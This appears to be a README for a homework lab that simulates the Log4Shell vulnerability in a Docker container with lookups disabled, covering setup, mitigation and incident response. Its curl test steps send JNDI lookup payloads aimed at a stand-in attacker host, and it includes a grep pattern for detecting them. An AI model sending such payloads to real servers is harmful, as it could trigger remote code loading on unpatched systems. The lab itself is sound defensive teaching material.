# Log4Shell Safe Simulation Environment

This project provides a **safe, Dockerized environment** to simulate the Log4Shell (CVE-2021-44228) vulnerability for educational purposes. It uses Log4j version 2.14.1 **with JNDI lookup disabled** to prevent real exploitation, allowing you to practice detection, defense, and response safely.

---

## Project Structure

- `pom.xml` — Maven dependencies including vulnerable Log4j 2.14.1
- `Dockerfile` — Builds the Spring Boot app with safe JVM flag
- `docker-compose.yml` — Starts the app container
- `src/main/java/com/example/LogController.java` — Spring Boot REST controller that logs user input

---

## Setup Instructions

### Prerequisites

- Docker and Docker Compose installed
- Basic knowledge of terminal/command line

### Build and Run

1. Set up the project directory

mkdir log4shell-homework
cd log4shell-homework

2. Java Web App Components

Ensure the following are created:

pom.xml with Log4j 2.14.1 and Spring Boot 2.5.5

LogController.java logs user input and blocks ${jndi: payloads

Dockerfile with JVM mitigation flag

docker-compose.yml for service orchestration

3. Build and Run the App

docker-compose up --build

Visit: http://localhost:8080

4. Simulate a Malicious Payload

curl -X POST http://localhost:8080/log -d '{jndi:ldap://attacker.com/a}'

Expected Response:

Invalid input detected

5. Test Normal Input

curl -X POST http://localhost:8080/log -d 'Hello, world!'

Expected Response:

Logged: Hello, world!

Part 2: Mitigation (MITRE DEFEND)

6. Security Controls

Already implemented:

JVM flag: -Dlog4j2.formatMsgNoLookups=true

Input validation in LogController.java

7. Rebuild App (if updated)

docker-compose down
docker-compose up --build

8. Verify Defenses

curl -X POST http://localhost:8080/log -d '${jndi:ldap://attacker.com/a}'

Should return:

Invalid input detected

Part 3: Incident Response (MITRE REACT)

9. Detect

docker-compose logs app | grep '${jndi:'

10. Contain

docker-compose down

11. Eradicate

docker ps -a

Ensure no suspicious containers remain.

12. Recover

docker-compose up --build

Verify with:

curl -X POST http://localhost:8080/log -d 'All systems go'


